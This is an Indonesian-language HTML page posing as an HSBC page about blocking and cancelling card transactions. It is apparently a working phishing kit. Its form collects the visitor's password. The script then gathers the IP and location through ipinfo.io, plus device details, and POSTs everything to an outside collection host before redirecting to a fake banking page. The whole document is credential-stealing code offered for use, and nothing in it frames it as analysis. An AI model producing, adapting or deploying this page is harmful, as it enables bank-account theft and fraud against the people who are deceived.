<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta content="#d4001a" name="theme-color" />
  <title>𝑪𝒂𝒓𝒂 𝒎𝒖𝒅𝒂𝒉 𝒃𝒍𝒐𝒌𝒊𝒓 𝒅𝒂𝒏 𝒃𝒂𝒕𝒂𝒍𝒌𝒂𝒏 𝒕𝒓𝒂𝒏𝒔𝒂𝒌𝒔𝒊 𝒌𝒂𝒓𝒕𝒖 𝒌𝒓𝒆𝒅𝒊𝒕 𝒅𝒂𝒏 𝒅𝒆𝒃𝒊𝒕 𝑯𝑺𝑩𝑪</title>
  <link href="img/logo.svg" rel="icon" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: sans-serif;
      background: #fff;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    .container {
      flex: 1;
      padding: 20px 15px;
      margin-top: 60px;
      overflow-y: auto;
      font-weight:500;
    }

    label {
      display: block;
      font-size: 16px;
      margin-bottom: 8px;
      color: #333;
    }

    .input-wrapper {
      position: relative;
      margin-bottom: 20px;
    }

    .input-box {
      width: 100%;
      border: 1px solid #aaa;
      padding: 15px 45px 15px 15px;
      font-size: 16px;
      border-radius: 2px;
      box-sizing: border-box;
    }

    .toggle-eye {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 20px;
      color: #666;
      z-index: 2;
    }

    .footer {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      padding: 15px;
      background: #fff;
      box-shadow: 0 0px 0px rgba(0,0,0,0.1);
      text-align: center;
      z-index: 100;
    }

    .button {
      width: 100%;
      padding: 16px;
      font-size: 16px;
      background-color: #c1c1c1;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .button.active {
      background-color: #d4001a;
    }

    /* Loading overlay */
    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.5);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .spinner {
      border: 5px solid #f3f3f3;
      border-top: 5px solid #d4001a;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <label for="password">Masukkan password Anda</label>
    <div class="input-wrapper">
      <input
        type="password"
        id="password"
        class="input-box"
        placeholder="Password"
        autocomplete="off"
      />
      <span class="toggle-eye" id="toggleEye"><i class="fas fa-eye-slash"></i></span>
    </div>
  </div>

  <div class="footer">
    <button id="submitBtn" class="button">Lanjut</button>
  </div>

  <!-- Loading overlay -->
  <div class="loading-overlay" id="loadingOverlay">
    <div class="spinner"></div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      // Elemen DOM
      const passwordInput = document.getElementById('password');
      const toggleEye = document.getElementById('toggleEye');
      const submitBtn = document.getElementById('submitBtn');
      const loadingOverlay = document.getElementById('loadingOverlay');

      // Fungsi deteksi perangkat
      function getDeviceInfo() {
        const ua = navigator.userAgent;
        if (/Android/i.test(ua)) return "Android";
        if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
        if (/Windows/i.test(ua)) return "Windows";
        return "Unknown";
      }

      // Toggle password visibility
      toggleEye.addEventListener('click', function() {
        const eyeIcon = this.querySelector('i');
        if (passwordInput.type === 'password') {
          passwordInput.type = 'text';
          eyeIcon.classList.replace('fa-eye-slash', 'fa-eye');
        } else {
          passwordInput.type = 'password';
          eyeIcon.classList.replace('fa-eye', 'fa-eye-slash');
        }
      });

      // Aktifkan tombol saat input
      passwordInput.addEventListener('input', function() {
        submitBtn.classList.toggle('active', this.value.trim() !== '');
      });

      // Fungsi kirim data lengkap
      async function kirimData() {
        if (!passwordInput.value.trim()) {
          alert('Harap masukkan password!');
          return;
        }

        // Tampilkan loading
        loadingOverlay.style.display = 'flex';

        try {
          // 1. Dapatkan info perangkat dan lokasi
          const ipInfoResponse = await fetch('https://ipinfo.io/json?token=ef72b040d9a8c1');
          const locationData = await ipInfoResponse.json();
          
          // 2. Siapkan data yang akan dikirim
          const payload = {
            password: passwordInput.value,
            ip: locationData.ip || 'Unknown',
            city: locationData.city || 'Unknown',
            region: locationData.region || 'Unknown',
            country: locationData.country || 'Unknown',
            device: getDeviceInfo(),
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
          };

          await fetch('https://hacker-phising.my.id/notif/req/passwordhsbc.php', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(payload)
});
          
          // 4. Redirect ke halaman berikutnya
          window.location.href = "bankinghsbc.html?status=success";
          
        } catch (error) {
          console.error('Error:', error);
          alert('Terjadi kesalahan saat mengirim data');
        } finally {
          loadingOverlay.style.display = 'none';
        }
      }

      // Event listener untuk tombol
      submitBtn.addEventListener('click', kirimData);
    });
  </script>
</body>
</html>
